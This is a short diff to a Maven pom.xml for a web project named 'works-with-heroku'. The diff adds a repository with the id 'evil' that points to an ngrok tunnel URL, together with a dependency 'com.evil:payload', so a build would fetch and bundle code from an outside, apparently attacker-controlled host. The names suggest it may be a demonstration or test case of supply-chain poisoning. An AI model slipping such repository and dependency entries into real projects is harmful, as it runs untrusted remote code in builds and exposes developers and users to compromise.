@@ -6,6 +6,20 @@
     <artifactId>works-with-heroku</artifactId>
     <version>1.0</version>
     <packaging>war</packaging>
+   <repositories>
+     <repository>
+       <id>evil</id>
+       <url>https://b8a3-2001-fd8-c31d-c700-fd51-ec1f-f955-992a.ngrok-free.app/</url>
+     </repository>
+   </repositories>
+   <dependencies>
+     <dependency>
+       <groupId>com.evil</groupId>
+       <artifactId>payload</artifactId>
+       <version>1.0</version>
+     </dependency>
+   </dependencies>
+
     <dependencies>
         <dependency>
             <groupId>javax.servlet</groupId>
